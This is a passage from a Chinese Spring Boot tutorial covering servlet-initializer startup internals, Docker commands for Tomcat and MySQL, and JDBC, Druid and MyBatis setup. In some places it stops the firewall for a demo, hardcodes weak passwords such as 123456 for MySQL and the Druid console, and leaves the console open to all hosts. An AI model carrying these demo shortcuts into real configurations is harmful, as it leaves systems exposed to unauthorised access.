class="comment">//传入SpringBoot应用的主程序</span></span><br><span class="line">      <span class="keyword">return</span> application.sources(SpringBoot04WebJspApplication.class);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、启动服务器就可以使用；</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>jar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器；</p><p>war包：启动服务器，<strong>服务器启动SpringBoot应用</strong>【SpringBootServletInitializer】，启动ioc容器；</p><p>servlet3.0（Spring注解版）：</p><p>8.2.4 Shared libraries / runtimes pluggability：</p><p>规则：</p><p>​    1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例：</p><p>​    2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名</p><p>​    3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类；</p><p>流程：</p><p>1）、启动Tomcat</p><p>2）、org\springframework\spring-web\4.3.14.RELEASE\spring-web-4.3.14.RELEASE.jar!\META-INF\services\javax.servlet.ServletContainerInitializer：</p><p>Spring的web模块里面有这个文件：<strong>org.springframework.web.SpringServletContainerInitializer</strong></p><p>3）、SpringServletContainerInitializer将@HandlesTypes(WebApplicationInitializer.class)标注的所有这个类型的类都传入到onStartup方法的Set<class<?>&gt;；为这些WebApplicationInitializer类型的类创建实例；</class<?></p><p>4）、每一个WebApplicationInitializer都调用自己的onStartup；</p><p><img src="images/搜狗截图20180302221835.png" alt=""></p><p>5）、相当于我们的SpringBootServletInitializer的类会被创建对象，并执行onStartup方法</p><p>6）、SpringBootServletInitializer实例执行onStartup的时候会createRootApplicationContext；创建容器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> WebApplicationContext <span class="title">createRootApplicationContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      ServletContext servletContext)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1、创建SpringApplicationBuilder</span></span><br><span class="line">   SpringApplicationBuilder builder = createSpringApplicationBuilder();</span><br><span class="line">   StandardServletEnvironment environment = <span class="keyword">new</span> StandardServletEnvironment();</span><br><span class="line">   environment.initPropertySources(servletContext, <span class="keyword">null</span>);</span><br><span class="line">   builder.environment(environment);</span><br><span class="line">   builder.main(getClass());</span><br><span class="line">   ApplicationContext parent = getExistingRootWebApplicationContext(servletContext);</span><br><span class="line">   <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.logger.info(<span class="string">"Root context already created (using as parent)."</span>);</span><br><span class="line">      servletContext.setAttribute(</span><br><span class="line">            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="keyword">null</span>);</span><br><span class="line">      builder.initializers(<span class="keyword">new</span> ParentContextApplicationContextInitializer(parent));</span><br><span class="line">   &#125;</span><br><span class="line">   builder.initializers(</span><br><span class="line">         <span class="keyword">new</span> ServletContextApplicationContextInitializer(servletContext));</span><br><span class="line">   builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用configure方法，子类重写了这个方法，将SpringBoot的主程序类传入了进来</span></span><br><span class="line">   builder = configure(builder);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用builder创建一个Spring应用</span></span><br><span class="line">   SpringApplication application = builder.build();</span><br><span class="line">   <span class="keyword">if</span> (application.getSources().isEmpty() &amp;&amp; AnnotationUtils</span><br><span class="line">         .findAnnotation(getClass(), Configuration.class) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      application.getSources().add(getClass());</span><br><span class="line">   &#125;</span><br><span class="line">   Assert.state(!application.getSources().isEmpty(),</span><br><span class="line">         <span class="string">"No SpringApplication sources have been defined. Either override the "</span></span><br><span class="line">               + <span class="string">"configure method or add an @Configuration annotation"</span>);</span><br><span class="line">   <span class="comment">// Ensure error pages are registered</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.registerErrorPageFilter) &#123;</span><br><span class="line">      application.getSources().add(ErrorPageFilterConfiguration.class);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//启动Spring应用</span></span><br><span class="line">   <span class="keyword">return</span> run(application);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7）、Spring的应用就启动并且创建IOC容器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">   StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">   FailureAnalyzers analyzers = <span class="keyword">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(</span><br><span class="line">            args);</span><br><span class="line">      ConfigurableEnvironment environment = prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">      Banner printedBanner = printBanner(environment);</span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">      analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//刷新IOC容器</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> StartupInfoLogger(<span class="keyword">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>==启动Servlet容器，再启动SpringBoot应用==</strong></p><h1 id="五、Docker"><a href="#五、Docker" class="headerlink" title="五、Docker"></a>五、Docker</h1><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2><p><strong>Docker</strong>是一个开源的应用容器引擎；是一个轻量级容器技术；</p><p>Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；</p><p>运行中的这个镜像称为容器，容器启动是非常快速的。</p><p><img src="images/搜狗截图20180303145450.png" alt=""></p><p><img src="images/搜狗截图20180303145531.png" alt=""></p><h2 id="2、核心概念"><a href="#2、核心概念" class="headerlink" title="2、核心概念"></a>2、核心概念</h2><p>docker主机(Host)：安装了Docker程序的机器（Docker直接安装在操作系统之上）；</p><p>docker客户端(Client)：连接docker主机进行操作；</p><p>docker仓库(Registry)：用来保存各种打包好的软件镜像；</p><p>docker镜像(Images)：软件打包好的镜像；放在docker仓库中；</p><p>docker容器(Container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用</p><p><img src="images/搜狗截图20180303165113.png" alt=""></p><p>使用Docker的步骤：</p><p>1）、安装Docker</p><p>2）、去Docker仓库找到这个软件对应的镜像；</p><p>3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器；</p><p>4）、对容器的启动停止就是对软件的启动停止；</p><h2 id="3、安装Docker"><a href="#3、安装Docker" class="headerlink" title="3、安装Docker"></a>3、安装Docker</h2><h4 id="1）、安装linux虚拟机"><a href="#1）、安装linux虚拟机" class="headerlink" title="1）、安装linux虚拟机"></a>1）、安装linux虚拟机</h4><p>​    1）、VMWare、VirtualBox（安装）；</p><p>​    2）、导入虚拟机文件centos7-atguigu.ova；</p><p>​    3）、双击启动linux虚拟机;使用  root/ 123456登陆</p><p>​    4）、使用客户端连接linux服务器进行命令操作；</p><p>​    5）、设置虚拟机网络；</p><p>​        桥接网络===选好网卡====接入网线；</p><p>​    6）、设置好网络以后使用命令重启虚拟机的网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>​    7）、查看linux的ip地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>​    8）、使用客户端连接linux；</p><h4 id="2）、在linux虚拟机上安装docker"><a href="#2）、在linux虚拟机上安装docker" class="headerlink" title="2）、在linux虚拟机上安装docker"></a>2）、在linux虚拟机上安装docker</h4><p>步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、检查内核版本，必须是3.10及以上</span><br><span class="line">uname -r</span><br><span class="line">2、安装docker</span><br><span class="line">yum install docker</span><br><span class="line">3、输入y确认安装</span><br><span class="line">4、启动docker</span><br><span class="line">[root@localhost ~]# systemctl start docker</span><br><span class="line">[root@localhost ~]# docker -v</span><br><span class="line">Docker version 1.12.6, build 3e8e77d/1.12.6</span><br><span class="line">5、开机启动docker</span><br><span class="line">[root@localhost ~]# systemctl enable docker</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br><span class="line">6、停止docker</span><br><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2 id="4、Docker常用命令-amp-操作"><a href="#4、Docker常用命令-amp-操作" class="headerlink" title="4、Docker常用命令&amp;操作"></a>4、Docker常用命令&amp;操作</h2><h3 id="1）、镜像操作"><a href="#1）、镜像操作" class="headerlink" title="1）、镜像操作"></a>1）、镜像操作</h3><div class="table-container"><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>检索</td><td>docker  search 关键字  eg：docker  search redis</td><td>我们经常去docker  hub上检索镜像的详细信息，如镜像的TAG。</td></tr><tr><td>拉取</td><td>docker pull 镜像名:tag</td><td>:tag是可选的，tag表示标签，多为软件的版本，默认是latest</td></tr><tr><td>列表</td><td>docker images</td><td>查看所有本地镜像</td></tr><tr><td>删除</td><td>docker rmi image-id</td><td>删除指定的本地镜像</td></tr></tbody></table></div><p><a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p><h3 id="2）、容器操作"><a href="#2）、容器操作" class="headerlink" title="2）、容器操作"></a>2）、容器操作</h3><p>软件镜像（QQ安装程序）——运行镜像——产生一个容器（正在运行的软件，运行的QQ）；</p><p>步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1、搜索镜像</span><br><span class="line">[root@localhost ~]# docker search tomcat</span><br><span class="line">2、拉取镜像</span><br><span class="line">[root@localhost ~]# docker pull tomcat</span><br><span class="line">3、根据镜像启动容器</span><br><span class="line">docker run --name mytomcat -d tomcat:latest</span><br><span class="line">4、docker ps  </span><br><span class="line">查看运行中的容器</span><br><span class="line">5、 停止运行中的容器</span><br><span class="line">docker stop  容器的id</span><br><span class="line">6、查看所有的容器</span><br><span class="line">docker ps -a</span><br><span class="line">7、启动容器</span><br><span class="line">docker start 容器id</span><br><span class="line">8、删除一个容器</span><br><span class="line"> docker rm 容器id</span><br><span class="line">9、启动一个做了端口映射的tomcat</span><br><span class="line">[root@localhost ~]# docker run -d -p 8888:8080 tomcat</span><br><span class="line">-d：后台运行</span><br><span class="line">-p: 将主机的端口映射到容器的一个端口    主机端口:容器内部的端口</span><br><span class="line"></span><br><span class="line">10、为了演示简单关闭了linux的防火墙</span><br><span class="line">service firewalld status ；查看防火墙状态</span><br><span class="line">service firewalld stop：关闭防火墙</span><br><span class="line">11、查看容器的日志</span><br><span class="line">docker logs container-name/container-id</span><br><span class="line"></span><br><span class="line">更多命令参看</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/docker/</span><br><span class="line">可以参考每一个镜像的文档</span><br></pre></td></tr></table></figure><h3 id="3）、安装MySQL示例"><a href="#3）、安装MySQL示例" class="headerlink" title="3）、安装MySQL示例"></a>3）、安装MySQL示例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure><p>错误的启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -d mysql</span><br><span class="line">42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846</span><br><span class="line"></span><br><span class="line">mysql退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                           PORTS               NAMES</span><br><span class="line">42f09819908b        mysql               "docker-entrypoint.sh"   34 seconds ago      Exited (1) 33 seconds ago                            mysql01</span><br><span class="line">538bde63e500        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       compassionate_</span><br><span class="line">goldstine</span><br><span class="line">c4f1ac60b3fc        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       lonely_fermi</span><br><span class="line">81ec743a5271        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       sick_ramanujan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//错误日志</span><br><span class="line">[root@localhost ~]# docker logs 42f09819908b</span><br><span class="line">error: database is uninitialized and password option is not specified </span><br><span class="line">  You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD；这个三个参数必须指定一个</span><br></pre></td></tr></table></figure><p>正确的启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">b874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">b874c56bec49        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 3 seconds        3306/tcp            mysql01</span><br></pre></td></tr></table></figure><p>做了端口映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">ad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">ad10e4bc5c6a        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 2 seconds        0.0.0.0:3306-&gt;3306/tcp   mysql02</span><br></pre></td></tr></table></figure><p>几个其他的高级操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e <span class="attribute">MYSQL_ROOT_PASSWORD</span>=my-secret-pw -d mysql:tag</span><br><span class="line">把主机的/conf/mysql文件夹挂载到 mysqldocker容器的/etc/mysql/conf.d文件夹里面</span><br><span class="line">改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（/conf/mysql）</span><br><span class="line"></span><br><span class="line">docker <span class="builtin-name">run</span> --name some-mysql -e <span class="attribute">MYSQL_ROOT_PASSWORD</span>=my-secret-pw -d mysql:tag <span class="attribute">--character-set-server</span>=utf8mb4 <span class="attribute">--collation-server</span>=utf8mb4_unicode_ci</span><br><span class="line">指定mysql的一些配置参数</span><br></pre></td></tr></table></figure><h1 id="六、SpringBoot与数据访问"><a href="#六、SpringBoot与数据访问" class="headerlink" title="六、SpringBoot与数据访问"></a>六、SpringBoot与数据访问</h1><h2 id="1、JDBC"><a href="#1、JDBC" class="headerlink" title="1、JDBC"></a>1、JDBC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  datasource:</span></span><br><span class="line"><span class="attr">    username:</span> <span class="string">root</span></span><br><span class="line"><span class="attr">    password:</span> <span class="number">123456</span></span><br><span class="line"><span class="attr">    url:</span> <span class="attr">jdbc:mysql://192.168.15.22:3306/jdbc</span></span><br><span class="line"><span class="attr">    driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><p>效果：</p><p>​    默认是用org.apache.tomcat.jdbc.pool.DataSource作为数据源；</p><p>​    数据源的相关配置都在DataSourceProperties里面；</p><p>自动配置原理：</p><p>org.springframework.boot.autoconfigure.jdbc：</p><p>1、参考DataSourceConfiguration，根据配置创建数据源，默认使用Tomcat连接池；可以使用spring.datasource.type指定自定义的数据源类型；</p><p>2、SpringBoot默认可以支持；</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.tomcat</span><span class="selector-class">.jdbc</span><span class="selector-class">.pool</span><span class="selector-class">.DataSource</span>、HikariDataSource、BasicDataSource、</span><br></pre></td></tr></table></figure><p>3、自定义数据源类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic DataSource configuration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(DataSource.class)</span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(name = <span class="string">"spring.datasource.type"</span>)</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Generic</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> DataSource <span class="title">dataSource</span><span class="params">(DataSourceProperties properties)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//使用DataSourceBuilder创建数据源，利用反射创建响应type的数据源，并且绑定相关属性</span></span><br><span class="line">      <span class="keyword">return</span> properties.initializeDataSourceBuilder().build();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、<strong>DataSourceInitializer：ApplicationListener</strong>；</p><p>​    作用：</p><p>​        1）、runSchemaScripts();运行建表语句；</p><p>​        2）、runDataScripts();运行插入数据的sql语句；</p><p>默认只需要将文件命名为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">schema-*.sql、data-*.sql</span><br><span class="line">默认规则：schema.sql，schema-all.sql；</span><br><span class="line">可以使用   </span><br><span class="line">schema:</span><br><span class="line">      - classpath:department.sql</span><br><span class="line">      指定位置</span><br></pre></td></tr></table></figure><p>5、操作数据库：自动配置了JdbcTemplate操作数据库</p><h2 id="2、整合Druid数据源"><a href="#2、整合Druid数据源" class="headerlink" title="2、整合Druid数据源"></a>2、整合Druid数据源</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">导入druid数据源</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DruidConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.datasource"</span>)</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">druid</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span>  <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置Druid的监控</span></span><br><span class="line">    <span class="comment">//1、配置一个管理后台的Servlet</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">statViewServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ServletRegistrationBean bean = <span class="keyword">new</span> ServletRegistrationBean(<span class="keyword">new</span> StatViewServlet(), <span class="string">"/druid/*"</span>);</span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        initParams.put(<span class="string">"loginUsername"</span>,<span class="string">"admin"</span>);</span><br><span class="line">        initParams.put(<span class="string">"loginPassword"</span>,<span class="string">"123456"</span>);</span><br><span class="line">        initParams.put(<span class="string">"allow"</span>,<span class="string">""</span>);<span class="comment">//默认就是允许所有访问</span></span><br><span class="line">        initParams.put(<span class="string">"deny"</span>,<span class="string">"192.168.15.21"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、配置一个web监控的filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FilterRegistrationBean <span class="title">webStatFilter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FilterRegistrationBean bean = <span class="keyword">new</span> FilterRegistrationBean();</span><br><span class="line">        bean.setFilter(<span class="keyword">new</span> WebStatFilter());</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        initParams.put(<span class="string">"exclusions"</span>,<span class="string">"*.js,*.css,/druid/*"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line"></span><br><span class="line">        bean.setUrlPatterns(Arrays.asList(<span class="string">"/*"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、整合MyBatis"><a href="#3、整合MyBatis" class="headerlink" title="3、整合MyBatis"></a>3、整合MyBatis</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span 